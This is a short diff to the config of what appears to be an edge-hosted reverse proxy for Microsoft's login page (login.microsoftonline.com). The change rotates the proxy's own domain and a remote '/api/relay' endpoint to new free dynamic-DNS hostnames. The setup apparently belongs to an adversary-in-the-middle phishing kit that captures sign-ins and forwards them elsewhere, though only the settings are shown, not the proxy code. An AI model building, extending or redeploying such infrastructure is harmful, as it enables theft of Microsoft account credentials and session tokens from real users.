@@ -1,8 +1,8 @@
 export const runtime = 'edge';
 
 // ==================== CONFIG ====================
-const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app'; // Change to your domain
-const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
+const YOUR_DOMAIN = 'verceldata.camdvr.org'; // Change to your domain
+const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
 const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
